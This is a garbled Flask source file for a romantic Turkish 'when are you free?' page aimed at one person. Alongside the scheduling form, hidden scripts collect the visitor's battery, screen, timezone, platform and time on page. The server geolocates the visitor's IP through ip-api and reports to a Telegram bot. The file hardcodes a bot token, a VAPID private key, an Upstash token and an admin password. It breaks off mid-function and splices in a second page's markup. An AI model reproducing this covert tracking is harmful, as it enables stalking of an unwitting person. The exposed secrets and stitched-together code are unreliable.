import os
import json
import requests
from flask import Flask, redirect, request, render_template_string, jsonify, send_from_directory, Response

app = Flask(__name__)

TELEGRAM_TOKEN = "8469271411:AAEMaIvq-GrE2_col2-py9IuOO3oyahMxR0"
CHAT_ID = "7141351945"
HEDEF_URL = "https://x.com/hepkirildi/status/2065489119833157669?s=20"

# Push bildirim ayarları
VAPID_PUBLIC_KEY  = os.environ.get("VAPID_PUBLIC_KEY",  "BFDOkQo7sDb26BGga2Gi6AcYR3WpcSxHRXJdkgiELD92r1Fb4Vw0FHWxnEb_YvVJP4fBLKKNk1SCyvtgaTOmdxw")
VAPID_PRIVATE_KEY = os.environ.get("VAPID_PRIVATE_KEY", "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgpu7Uw20PEGPqb9B0pgJdnVK68D2qNbZAXb7O982NQ8yhRANCAARQzpEKO7A29ugRoGthougHGEd1qXEsR0VyXZIIhCw/dq9RW+FcNBR1sZxG/2L1ST+HwSyijZNUgsr7YGkzpncc")
VAPID_CONTACT     = "mailto:admin@admin.com"
ADMIN_SECRET      = os.environ.get("ADMIN_SECRET", "furkangizli99")

# Upstash Redis (ücretsiz – push aboneliklerini ve bekleyen mesajı saklar)
UPSTASH_URL   = os.environ.get("UPSTASH_URL",   "https://normal-louse-128433.upstash.io")
UPSTASH_TOKEN = os.environ.get("UPSTASH_TOKEN", "gQAAAAAAAfWxAQIgcDExNTBhYzM3NGUxN2Y0OWRmOTUxM2UyZjI4NTBiM2EzNQ")


def upstash(command, *args):
    """Upstash Redis REST API üzerinden komut çalıştır."""
    if not UPSTASH_URL or not UPSTASH_TOKEN:
        return None
    try:
        r = requests.post(
            UPSTASH_URL,
            headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
            json=[command, *args],
            timeout=5,
        )
        return r.json().get("result")
    except Exception as e:
        print("Upstash hatası:", e)
        return None

HTML_SAYFA = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ne Zaman Müsaitsin?</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Lato:wght@300;400&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{
      min-height:100vh;
      background:#1a0a0f;
      font-family:'Lato',sans-serif;
      overflow-x:hidden;
      position:relative;
    }
    #slideshow{position:fixed;inset:0;z-index:0;}
    .slayt{
      position:absolute;inset:0;
      background-size:cover;background-position:center;
      opacity:0;transition:opacity 1.8s ease-in-out;
      animation:kenBurns 12s ease-in-out infinite alternate;
    }
    .slayt.aktif{opacity:1;}
    @keyframes kenBurns{0%{transform:scale(1)}100%{transform:scale(1.08) translate(-1%,-1%)}}
    #overlay{
      position:fixed;inset:0;z-index:0;
      background:linear-gradient(to bottom,rgba(15,4,8,.65) 0%,rgba(15,4,8,.55) 50%,rgba(15,4,8,.72) 100%);
    }
    body::before{
      content:'';position:fixed;inset:0;
      background:
        radial-gradient(ellipse at 20% 50%,rgba(180,30,60,.18) 0%,transparent 60%),
        radial-gradient(ellipse at 80% 20%,rgba(200,50,80,.12) 0%,transparent 55%),
        radial-gradient(ellipse at 60% 80%,rgba(150,20,50,.14) 0%,transparent 50%);
      pointer-events:none;z-index:0;
    }
    .kalpler{position:fixed;inset:0;pointer-events:none;z-index:0;}
    .kalp{
      position:absolute;bottom:-60px;font-size:1.4rem;opacity:0;
      animation:yukari-ucus linear infinite;
    }
    @keyframes yukari-ucus{
      0%{transform:translateY(0) scale(.8);opacity:0;}
      10%{opacity:.6;}90%{opacity:.3;}
      100%{transform:translateY(-110vh) scale(1.2);opacity:0;}
    }
    @keyframes kalp-at{0%,100%{transform:scale(1);}50%{transform:scale(1.15);}}

    /* ── Sayfa düzeni ── */
    .sayfa{
      position:relative;z-index:1;
      min-height:100vh;
      padding:40px 16px 60px;
      display:flex;flex-direction:column;align-items:center;
    }
    .baslik{
      text-align:center;margin-bottom:36px;
    }
    .baslik .ikon{font-size:2.4rem;animation:kalp-at 1.6s ease-in-out infinite;display:block;margin-bottom:12px;}
    .baslik h1{
      color:#f2d0d8;font-family:'Playfair Display',serif;
      font-size:1.7rem;font-weight:700;letter-spacing:.3px;margin-bottom:6px;
    }
    .baslik p{color:rgba(220,150,165,.65);font-size:.9rem;font-weight:300;font-style:italic;}

    /* ── Günler ── */
    .gunler{
      display:flex;flex-wrap:wrap;gap:10px;
      justify-content:center;margin-bottom:28px;
      width:100%;max-width:520px;
    }
    .gun-btn{
      flex:1 1 calc(14% - 10px);min-width:64px;
      padding:10px 6px;
      background:rgba(30,8,16,.7);
      border:1.5px solid rgba(220,80,100,.2);
      border-radius:14px;color:#f5dce0;
      font-family:'Lato',sans-serif;font-size:.82rem;font-weight:300;
      cursor:pointer;transition:all .2s;text-align:center;
    }
    .gun-btn .gun-ad{display:block;font-size:.7rem;color:rgba(220,150,165,.6);margin-bottom:3px;}
    .gun-btn .gun-tarih{display:block;font-size:.92rem;font-weight:400;}
    .gun-btn.secili{
      background:linear-gradient(135deg,rgba(192,57,79,.45) 0%,rgba(139,26,46,.45) 100%);
      border-color:rgba(220,80,100,.7);
      box-shadow:0 0 16px rgba(180,30,60,.3);
    }
    .gun-btn:hover:not(.secili){border-color:rgba(220,80,100,.4);background:rgba(40,12,22,.8);}

    /* ── Saat aralığı ── */
    .bolum{
      width:100%;max-width:520px;
      background:rgba(30,8,16,.75);
      border:1px solid rgba(220,80,100,.18);
      border-radius:20px;padding:22px 20px;
      margin-bottom:16px;
      backdrop-filter:blur(10px);
    }
    .bolum-baslik{
      color:rgba(220,150,165,.8);font-size:.8rem;font-weight:400;
      letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;
    }
    .saat-satirlari{display:flex;gap:10px;align-items:center;flex-wrap:wrap;}
    .saat-grup{display:flex;flex-direction:column;gap:4px;flex:1;min-width:120px;}
    .saat-grup label{color:rgba(220,150,165,.6);font-size:.75rem;}
    .saat-input{
      width:100%;background:rgba(255,255,255,.05);
      border:1px solid rgba(220,80,100,.22);border-radius:10px;
      color:#f5dce0;font-family:'Lato',sans-serif;font-size:.95rem;
      padding:10px 12px;outline:none;
      transition:border-color .3s,box-shadow .3s;
      cursor:pointer;
    }
    .saat-input:focus{border-color:rgba(220,80,100,.55);box-shadow:0 0 0 3px rgba(180,30,60,.12);}
    /* style native time picker arrow to match */
    .saat-input::-webkit-calendar-picker-indicator{filter:invert(.7) sepia(1) hue-rotate(300deg);}
    .arada{color:rgba(220,150,165,.5);font-size:.8rem;padding-top:18px;}

    /* ── Dakika aralığı ── */
    .dk-secenekler{display:flex;gap:10px;flex-wrap:wrap;}
    .dk-btn{
      padding:9px 22px;
      background:rgba(255,255,255,.04);
      border:1.5px solid rgba(220,80,100,.2);
      border-radius:50px;color:#f5dce0;
      font-family:'Lato',sans-serif;font-size:.9rem;
      cursor:pointer;transition:all .2s;
    }
    .dk-btn.secili{
      background:linear-gradient(135deg,rgba(192,57,79,.5) 0%,rgba(139,26,46,.5) 100%);
      border-color:rgba(220,80,100,.7);
      box-shadow:0 0 12px rgba(180,30,60,.25);
    }
    .dk-btn:hover:not(.secili){border-color:rgba(220,80,100,.4);}

    /* ── Gönder butonu ── */
    .gonder-btn{
      margin-top:10px;width:100%;max-width:520px;
      padding:15px;
      background:linear-gradient(135deg,#c0394f 0%,#8b1a2e 100%);
      color:#ffe4ea;font-family:'Playfair Display',serif;
      font-size:1.05rem;font-weight:700;letter-spacing:.5px;
      border:none;border-radius:16px;cursor:pointer;
      transition:opacity .2s,transform .15s,box-shadow .2s;
      box-shadow:0 4px 20px rgba(180,30,60,.35);
    }
    .gonder-btn:hover{opacity:.9;transform:translateY(-1px);box-shadow:0 8px 28px rgba(180,30,60,.45);}
    .gonder-btn:active{transform:translateY(0);}
    .gonder-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}

    .ayirici{text-align:center;color:rgba(220,80,100,.3);font-size:.8rem;margin-top:18px;letter-spacing:2px;}

    /* ── Sonuç mesajları ── */
    .mesaj-ok,.mesaj-hata{
      width:100%;max-width:520px;
      margin-top:14px;border-radius:14px;
      padding:14px 18px;font-size:.92rem;text-align:center;font-style:italic;
    }
    .mesaj-ok{
      background:rgba(180,30,60,.15);border:1px solid rgba(220,80,100,.3);color:#f5a0b0;
      display:{{ 'block' if basarili else 'none' }};
    }
    .mesaj-hata{
      background:rgba(80,20,20,.4);border:1px solid rgba(180,60,60,.35);color:#f87171;
      display:{{ 'block' if hata else 'none' }};
    }

    /* ── Admin popup ── */
    #admin-popup{
      display:none;position:fixed;inset:0;z-index:999;
      align-items:center;justify-content:center;
      background:rgba(10,2,6,.75);backdrop-filter:blur(6px);
    }
    #admin-popup.goster{display:flex;}
    .popup-ic{
      background:rgba(30,8,16,.97);border:1px solid rgba(220,80,100,.4);
      border-radius:24px;padding:40px 36px;max-width:380px;width:90%;
      text-align:center;box-shadow:0 0 80px rgba(180,30,60,.3);
      animation:popup-gir .5s cubic-bezier(.22,.68,0,1.2);
    }
    @keyframes popup-gir{from{transform:scale(.7);opacity:0;}to{transform:scale(1);opacity:1;}}
    .popup-ikon{font-size:3rem;margin-bottom:14px;animation:kalp-at 1.4s ease-in-out infinite;}
    .popup-ic h3{color:#f2d0d8;font-family:'Playfair Display',serif;font-size:1.35rem;margin-bottom:14px;}
    .popup-ic p{color:#f5dce0;font-size:1.05rem;line-height:1.7;font-weight:300;white-space:pre-wrap;}
    .popup-kapat{
      margin-top:24px;background:linear-gradient(135deg,#c0394f 0%,#8b1a2e 100%);
      color:#ffe4ea;border:none;border-radius:12px;padding:10px 28px;
      font-family:'Playfair Display',serif;font-size:.95rem;cursor:pointer;
      width:auto;box-shadow:0 4px 16px rgba(180,30,60,.35);
    }
  </style>
</head>
<body>

  <div id="slideshow"></div>
  <div id="overlay"></div>
  <div class="kalpler" id="kalpler"></div>

  <!-- Admin popup -->
  <div id="admin-popup">
    <div class="popup-ic">
      <div class="popup-ikon">💌</div>
      <h3>Sana bir mesaj var...</h3>
      <p id="popup-metin"></p>
      <button class="popup-kapat" onclick="document.getElementById('admin-popup').classList.remove('goster')">❤️ &nbsp;Gördüm</button>
    </div>
  </div>

  <div class="sayfa">
    <div class="baslik">
      <span class="ikon">🌹</span>
      <h1>Ne Zaman Müsaitsin?</h1>
      <p>Önümüzdeki 7 gün için müsait olduğun günü ve saati seç</p>
    </div>

    <!-- Gün seçimi -->
    <div class="gunler" id="gunler"></div>

    <!-- Saat aralığı -->
    <div class="bolum">
      <div class="bolum-baslik">🕐 Saat Aralığı</div>
      <div class="saat-satirlari">
        <div class="saat-grup">
          <label>Başlangıç</label>
          <input type="time" class="saat-input" id="saat-baslangic" value="19:00"/>
        </div>
        <span class="arada">—</span>
        <div class="saat-grup">
          <label>Bitiş</label>
          <input type="time" class="saat-input" id="saat-bitis" value="22:00"/>
        </div>
      </div>
    </div>

    <!-- Dakika aralığı -->
    <div class="bolum">
      <div class="bolum-baslik">⏱ Konuşma Süresi</div>
      <div class="dk-secenekler">
        <button class="dk-btn" data-dk="5">5 dk</button>
        <button class="dk-btn secili" data-dk="10">10 dk</button>
        <button class="dk-btn" data-dk="30">30 dk</button>
        <button class="dk-btn" data-dk="60">1 saat</button>
      </div>
    </div>

    <button class="gonder-btn" id="gonder-btn" onclick="gonder()">💌 &nbsp;Gönder</button>

    <div class="mesaj-ok" id="mesaj-ok">🌸 Cevabın kalbe ulaştı...</div>
    <div class="mesaj-hata" id="mesaj-hata">✗ Bir hata oluştu, tekrar dene.</div>

    <p class="ayirici">· · · ♡ · · ·</p>
  </div>

  <script>
    // ── Slideshow ──
    fetch('/api/fotos').then(r=>r.json()).then(fotos=>{
      if(!fotos.length) return;
      const ss=document.getElementById('slideshow');
      const divler=fotos.map((f,i)=>{
        const d=document.createElement('div');
        d.className='slayt'+(i===0?' aktif':'');
        d.style.backgroundImage=`url('/static/photos/${f}')`;
        ss.appendChild(d);return d;
      });
      let cur=0;
      setInterval(()=>{divler[cur].classList.remove('aktif');cur=(cur+1)%divler.length;divler[cur].classList.add('aktif');},5000);
    });

    // ── Kalpler ──
    const emojiler=['❤️','🌹','💕','✨','🌸','💫','🥀','💗'];
    const kont=document.getElementById('kalpler');
    function kalp_ekle(){
      const el=document.createElement('span');el.className='kalp';
      el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];
      el.style.left=Math.random()*100+'vw';
      const s=6+Math.random()*8;el.style.animationDuration=s+'s';
      el.style.animationDelay=Math.random()*4+'s';
      el.style.fontSize=(0.9+Math.random()*1.2)+'rem';
      kont.appendChild(el);setTimeout(()=>el.remove(),(s+4)*1000);
    }
    for(let i=0;i<14;i++) setTimeout(kalp_ekle,i*600);
    setInterval(kalp_ekle,1800);

    // ── Günler oluştur ──
    const GUNLER=['Paz','Pzt','Sal','Çar','Per','Cum','Cmt'];
    const AYLAR=['Oca','Şub','Mar','Nis','May','Haz','Tem','Ağu','Eyl','Eki','Kas','Ara'];
    let seciliGunler=new Set();
    const gunlerDiv=document.getElementById('gunler');
    for(let i=0;i<7;i++){
      const d=new Date(); d.setDate(d.getDate()+i);
      const btn=document.createElement('button');
      btn.className='gun-btn';
      btn.dataset.iso=d.toISOString().slice(0,10);
      btn.dataset.label=GUNLER[d.getDay()]+' '+d.getDate()+' '+AYLAR[d.getMonth()];
      btn.innerHTML=`<span class="gun-ad">${GUNLER[d.getDay()]}</span><span class="gun-tarih">${d.getDate()} ${AYLAR[d.getMonth()]}</span>`;
      btn.onclick=()=>{
        if(seciliGunler.has(btn.dataset.iso)){seciliGunler.delete(btn.dataset.iso);btn.classList.remove('secili');}
        else{seciliGunler.add(btn.dataset.iso);btn.classList.add('secili');}
      };
      gunlerDiv.appendChild(btn);
    }

    // ── Dakika seçimi ──
    let seciliDk=10;
    document.querySelectorAll('.dk-btn').forEach(b=>{
      b.onclick=()=>{
        document.querySelectorAll('.dk-btn').forEach(x=>x.classList.remove('secili'));
        b.classList.add('secili');seciliDk=parseInt(b.dataset.dk);
      };
    });

    // ── Gönder ──
    function gonder(){
      if(seciliGunler.size===0){alert('Lütfen en az bir gün seç 🌸');return;}
      const bas=document.getElementById('saat-baslangic').value;
      const bit=document.getElementById('saat-bitis').value;
      if(!bas||!bit){alert('Lütfen saat aralığı gir');return;}
      const btn=document.getElementById('gonder-btn');
      btn.disabled=true;btn.textContent='Gönderiliyor...';
      const gunListesi=[...seciliGunler].map(iso=>{
        const d=new Date(iso+'T00:00:00');
        return GUNLER[d.getDay()]+' '+d.getDate()+' '+AYLAR[d.getMonth()];
      }).join(', ');
      const veri={gunler:gunListesi,baslangic:bas,bitis:bit,sure_dk:seciliDk};
      fetch('/musaitlik',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(veri)})
        .then(r=>r.json()).then(d=>{
          if(d.ok){
            document.getElementById('mesaj-ok').style.display='block';
            document.getElementById('mesaj-hata').style.display='none';
            btn.textContent='✓ Gönderildi';
          } else { throw new Error(); }
        }).catch(()=>{
          document.getElementById('mesaj-hata').style.display='block';
          btn.disabled=false;btn.textContent='💌 Tekrar Dene';
        });
    }

    // ── Ziyaretçi bilgisi ──
    const _t0=Date.now();
    (async()=>{
      let pil='?';
      try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'% '+(b.charging?'(Şarj oluyor)':'(Şarj değil)');}catch(e){pil='Erişilemiyor';}
      fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,
        saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:navigator.platform||navigator.userAgentData?.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'
      })});
    })();
    function _sure(){
      const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});
      navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});
    }
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});
    window.addEventListener('beforeunload',_sure);

    // ── Push bildirimi ──
    const VAPID_PUBLIC='{{ vapid_public }}';
    function urlB64(b){const p='='.repeat((4-b.length%4)%4),s=atob((b+p).replace(/-/g,'+').replace(/_/g,'/'));return Uint8Array.from([...s].map(c=>c.charCodeAt(0)));}
    async function pushKur(){
      if(!('serviceWorker' in navigator)||!('PushManager' in window))return;
      try{
        const reg=await navigator.serviceWorker.register('/sw.js');
        await navigator.serviceWorker.ready;
        const izin=await Notification.requestPermission();
        if(izin!=='granted')return;
        const sub=await reg.pushManager.getSubscription()||await reg.pushManager.subscribe({userVisibleOnly:true,applicationServerKey:urlB64(VAPID_PUBLIC)});
        fetch('/api/push-abone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(sub)});
      }catch(e){}
    }
    setTimeout(pushKur,3000);

    // ── Popup yoklama ──
    async function mesajKontrol(){
      try{const r=await fetch('/api/mesaj-var');const d=await r.json();
        if(d.mesaj){document.getElementById('popup-metin').textContent=d.mesaj;document.getElementById('admin-popup').classList.add('goster');}
      }catch(e){}
    }
    setInterval(mesajKontrol,6000);setTimeout(mesajKontrol,2000);
  </script>
</body>
</html>
"""


def bildirim_gonder(mesaj):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("Telegram credentials eksik.")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("Bildirim gönderilemedi:", e)
        return False


def gercek_ip_al(req):
    """Proxy arkasındaki gerçek IP'yi al."""
    for header in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"):
        val = req.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return req.remote_addr or "Bilinmiyor"


def ip_konum_al(ip):
    """ip-api.com üzerinden konum bilgisi çek."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
            timeout=5
        )
        if r.status_code == 200:

    /* Fotoğraf slideshow arka plan */
    #slideshow {
      position: fixed;
      inset: 0;
      z-index: 0;
    }
    .slayt {
      position: absolute;
      inset: 0;
      background-size: cover;
      background-position: center;
      opacity: 0;
      transition: opacity 1.8s ease-in-out;
      animation: kenBurns 12s ease-in-out infinite alternate;
    }
    .slayt.aktif { opacity: 1; }
    @keyframes kenBurns {
      0%   { transform: scale(1)    translate(0, 0); }
      100% { transform: scale(1.08) translate(-1%, -1%); }
    }
    /* Koyu romantik overlay */
    #overlay {
      position: fixed;
      inset: 0;
      background: linear-gradient(
        to bottom,
        rgba(15,4,8,0.55) 0%,
        rgba(15,4,8,0.45) 50%,
        rgba(15,4,8,0.65) 100%
      );
      z-index: 0;
    }

    /* Yüzen kalpler */
    .kalpler {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
    }
    .kalp {
      position: absolute;
      bottom: -60px;
      font-size: 1.4rem;
      opacity: 0;
      animation: yukari-ucus linear infinite;
    }
    @keyframes yukari-ucus {
      0%   { transform: translateY(0) scale(0.8); opacity: 0; }
      10%  { opacity: 0.6; }
      90%  { opacity: 0.3; }
      100% { transform: translateY(-110vh) scale(1.2); opacity: 0; }
    }

    /* Arka plan parıltıları */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse at 20% 50%, rgba(180,30,60,0.18) 0%, transparent 60%),
        radial-gradient(ellipse at 80% 20%, rgba(200,50,80,0.12) 0%, transparent 55%),
        radial-gradient(ellipse at 60% 80%, rgba(150,20,50,0.14) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    .kart {
      position: relative;
      z-index: 1;
      background: rgba(30, 8, 16, 0.85);
      border: 1px solid rgba(220, 80, 100, 0.25);
      border-radius: 24px;
      padding: 50px 44px;
      width: 100%;
      max-width: 480px;
      box-shadow:
        0 0 0 1px rgba(220,80,100,0.08),
        0 20px 60px rgba(0,0,0,0.6),
        0 0 80px rgba(180,30,60,0.12);
      backdrop-filter: blur(12px);
    }

    .ust-ikon {
      text-align: center;
      font-size: 2.2rem;
      margin-bottom: 18px;
      animation: kalp-at 1.6s ease-in-out infinite;
    }
    @keyframes kalp-at {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }

    h2 {
      color: #f2d0d8;
      font-family: 'Playfair Display', serif;
      font-size: 1.55rem;
      font-weight: 700;
      text-align: center;
      margin-bottom: 8px;
      letter-spacing: 0.3px;
    }

    p.alt {
      color: rgba(220,150,165,0.65);
      font-size: 0.88rem;
      text-align: center;
      margin-bottom: 32px;
      font-weight: 300;
      font-style: italic;
    }

    textarea {
      width: 100%;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(220,80,100,0.22);
      border-radius: 14px;
      color: #f5dce0;
      font-family: 'Lato', sans-serif;
      font-size: 0.95rem;
      font-weight: 300;
      padding: 16px;
      resize: vertical;
      min-height: 140px;
      outline: none;
      transition: border-color 0.3s, box-shadow 0.3s;
      line-height: 1.6;
    }
    textarea::placeholder { color: rgba(220,150,165,0.4); }
    textarea:focus {
      border-color: rgba(220,80,100,0.55);
      box-shadow: 0 0 0 3px rgba(180,30,60,0.12);
    }

    button {
      margin-top: 18px;
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #c0394f 0%, #8b1a2e 100%);
      color: #ffe4ea;
      font-family: 'Playfair Display', serif;
      font-size: 1rem;
      font-weight: 700;
      letter-spacing: 0.5px;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      transition: opacity 0.2s, transform 0.15s, box-shadow 0.2s;
      box-shadow: 0 4px 20px rgba(180,30,60,0.35);
    }
    button:hover {
      opacity: 0.9;
      transform: translateY(-1px);
      box-shadow: 0 8px 28px rgba(180,30,60,0.45);
    }
    button:active { transform: translateY(0); }

    .ayirici {
      text-align: center;
      color: rgba(220,80,100,0.3);
      font-size: 0.8rem;
      margin-top: 22px;
      letter-spacing: 2px;
    }

    .mesaj-ok {
      margin-top: 18px;
      background: rgba(180,30,60,0.15);
      border: 1px solid rgba(220,80,100,0.3);
      color: #f5a0b0;
      border-radius: 12px;
      padding: 13px 16px;
      font-size: 0.9rem;
      text-align: center;
      display: {{ 'block' if basarili else 'none' }};
      font-style: italic;
    }
    .mesaj-hata {
      margin-top: 18px;
      background: rgba(80,20,20,0.4);
      border: 1px solid rgba(180,60,60,0.35);
      color: #f87171;
      border-radius: 12px;
      padding: 13px 16px;
      font-size: 0.9rem;
      text-align: center;
      display: {{ 'block' if hata else 'none' }};
    }

    /* Admin popup mesaj kutusu */
    #admin-popup {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 999;
      align-items: center;
      justify-content: center;
      background: rgba(10,2,6,0.75);
      backdrop-filter: blur(6px);
      animation: fadeIn 0.4s ease;
    }
    #admin-popup.goster { display: flex; }
    @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
    .popup-ic {
      background: rgba(30,8,16,0.97);
      border: 1px solid rgba(220,80,100,0.4);
      border-radius: 24px;
      padding: 40px 36px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 80px rgba(180,30,60,0.3);
      animation: popup-gir 0.5s cubic-bezier(.22,.68,0,1.2);
    }
    @keyframes popup-gir { from { transform: scale(0.7); opacity:0; } to { transform: scale(1); opacity:1; } }
    .popup-ikon { font-size: 3rem; margin-bottom: 14px; animation: kalp-at 1.4s ease-in-out infinite; }
    .popup-ic h3 {
      color: #f2d0d8;
      font-family: 'Playfair Display', serif;
      font-size: 1.35rem;
      margin-bottom: 14px;
    }
    .popup-ic p {
      color: #f5dce0;
      font-size: 1.05rem;
      line-height: 1.7;
      font-weight: 300;
      white-space: pre-wrap;
    }
    .popup-kapat {
      margin-top: 24px;
      background: linear-gradient(135deg, #c0394f 0%, #8b1a2e 100%);
      color: #ffe4ea;
      border: none;
      border-radius: 12px;
      padding: 10px 28px;
      font-family: 'Playfair Display', serif;
      font-size: 0.95rem;
      cursor: pointer;
      width: auto;
      box-shadow: 0 4px 16px rgba(180,30,60,0.35);
    }
  </style>
</head>
<body>

  <!-- Fotoğraf slideshow -->
  <div id="slideshow"></div>
  <div id="overlay"></div>

  <!-- Yüzen kalpler -->
  <div class="kalpler" id="kalpler"></div>

  <!-- Admin mesaj popup -->
  <div id="admin-popup">
    <div class="popup-ic">
      <div class="popup-ikon">💌</div>
      <h3>Sana bir mesaj var...</h3>
      <p id="popup-metin"></p>
      <button class="popup-kapat" onclick="document.getElementById('admin-popup').classList.remove('goster')">❤️ &nbsp;Gördüm</button>
    </div>
  </div>

  <div class="kart">
    <div class="ust-ikon">🌹</div>
    <h2>Nasılsın yavrum? Hazır mısın? İyi misin?</h2>
    <form method="POST" action="/mesaj">
      <textarea name="mesaj" placeholder="Buradan sadece mesaj gönderiyorsun, bu sayfada olduğunu biliyorum, seni merak ediyorum..." required>{{ onceki_mesaj }}</textarea>
      <button type="submit">💌 &nbsp;Gönder</button>
    </form>
    <div class="mesaj-ok">🌸 Mesajın kalbe ulaştı...</div>
    <div class="mesaj-hata">✗ Bir hata oluştu, tekrar dene.</div>
    <p class="ayirici">· · · ♡ · · ·</p>
  </div>

  <script>
    // Fotoğraf slideshow
    fetch('/api/fotos')
      .then(r => r.json())
      .then(fotos => {
        if (!fotos.length) return;
        const ss = document.getElementById('slideshow');
        const divler = fotos.map((f, i) => {
          const d = document.createElement('div');
          d.className = 'slayt' + (i === 0 ? ' aktif' : '');
          d.style.backgroundImage = `url('/static/photos/${f}')`;
          ss.appendChild(d);
          return d;
        });
        let mevcut = 0;
        setInterval(() => {
          divler[mevcut].classList.remove('aktif');
          mevcut = (mevcut + 1) % divler.length;
          divler[mevcut].classList.add('aktif');
        }, 5000);
      });

    // Tarayıcı & sistem bilgilerini topla ve sunucuya gönder
    const _girisSaati = Date.now();
    (async () => {
      let pil = '?';
      try {
        const b = await navigator.getBattery();
        pil = (b.level * 100).toFixed(0) + '% ' + (b.charging ? '(Şarj oluyor)' : '(Şarj değil)');
      } catch(e) { pil = 'Erişilemiyor'; }

      const bilgi = {
        ekran:        screen.width + 'x' + screen.height + ' (' + screen.availWidth + 'x' + screen.availHeight + ' kullanılabilir)',
        pencere:      window.innerWidth + 'x' + window.innerHeight,
        saat:         new Date().toLocaleString('tr-TR'),
        zaman_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:     navigator.platform || navigator.userAgentData?.platform || '?',
        pil:          pil,
        cevrimici:    navigator.onLine ? 'Evet' : 'Hayır',
      };

      fetch('/api/bilgi', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(bilgi)
      });
    })();

    // Sayfada kalınan süreyi gönder
    function _sureyiGonder() {
      const saniye = Math.round((Date.now() - _girisSaati) / 1000);
      const veri = JSON.stringify({ saniye });
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/sure', new Blob([veri], { type: 'application/json' }));
      } else {
        fetch('/api/sure', { method: 'POST', headers: {'Content-Type':'application/json'}, body: veri, keepalive: true });
      }
    }
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') _sureyiGonder();
    });
    window.addEventListener('beforeunload', _sureyiGonder);

    const emojiler = ['❤️','🌹','💕','✨','🌸','💫','🥀','💗'];
    const kont = document.getElementById('kalpler');
    function kalp_ekle() {
      const el = document.createElement('span');
      el.className = 'kalp';
      el.textContent = emojiler[Math.floor(Math.random() * emojiler.length)];
      el.style.left = Math.random() * 100 + 'vw';
      const sure = 6 + Math.random() * 8;
      el.style.animationDuration = sure + 's';
      el.style.animationDelay = Math.random() * 4 + 's';
      el.style.fontSize = (0.9 + Math.random() * 1.2) + 'rem';
      kont.appendChild(el);
      setTimeout(() => el.remove(), (sure + 4) * 1000);
    }
    for (let i = 0; i < 14; i++) setTimeout(kalp_ekle, i * 600);
    setInterval(kalp_ekle, 1800);

    // ── Push bildirimi aboneliği ──────────────────────────
    const VAPID_PUBLIC = '{{ vapid_public }}';
    function urlBase64ToUint8(base64String) {
      const padding = '='.repeat((4 - base64String.length % 4) % 4);
      const b64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
      const raw = atob(b64);
      return Uint8Array.from([...raw].map(c => c.charCodeAt(0)));
    }
    async function pushAbonelikKur() {
      if (!('serviceWorker' in navigator) || !('PushManager' in window)) return;
      try {
        const reg = await navigator.serviceWorker.register('/sw.js');
        await navigator.serviceWorker.ready;
        const izin = await Notification.requestPermission();
        if (izin !== 'granted') return;
        const mevcut = await reg.pushManager.getSubscription();
        if (mevcut) { kaydetAbonelik(mevcut); return; }
        const sub = await reg.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: urlBase64ToUint8(VAPID_PUBLIC)
        });
        kaydetAbonelik(sub);
      } catch(e) { console.log('Push hatası:', e); }
    }
    function kaydetAbonelik(sub) {
      fetch('/api/push-abone', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sub)
      });
    }
    setTimeout(pushAbonelikKur, 3000);

    // ── Bekleyen mesaj yokla (site açıkken popup göster) ──
    async function mesajKontrol() {
      try {
        const r = await fetch('/api/mesaj-var');
        const d = await r.json();
        if (d.mesaj) {
          document.getElementById('popup-metin').textContent = d.mesaj;
          document.getElementById('admin-popup').classList.add('goster');
        }
      } catch(e) {}
